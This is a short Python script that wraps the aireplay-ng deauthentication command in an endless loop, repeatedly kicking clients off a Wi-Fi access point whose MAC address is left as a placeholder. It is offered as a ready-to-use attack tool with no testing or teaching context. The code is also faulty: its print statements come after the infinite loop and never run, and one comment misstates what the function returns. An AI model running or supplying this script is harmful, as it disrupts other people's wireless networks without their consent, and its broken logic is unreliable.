import subprocess
import time 

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
stderr=subprocess.PIPE, text=True)
    output, error = process.communicate()
    return output, error 
    # Returns only error, ignoring the output
    
# Specify your actual command
your_command = "sudo aireplay-ng -0 5 -a <WIFI MAC> wlan0"

while True:
   output, error = run_command(your_command) 

# Print the output and error if any
print("Command Output:", output)
print("Command Error:", error) 

#print("Continuing with the script in 15 seconds")
#time.sleep(15)
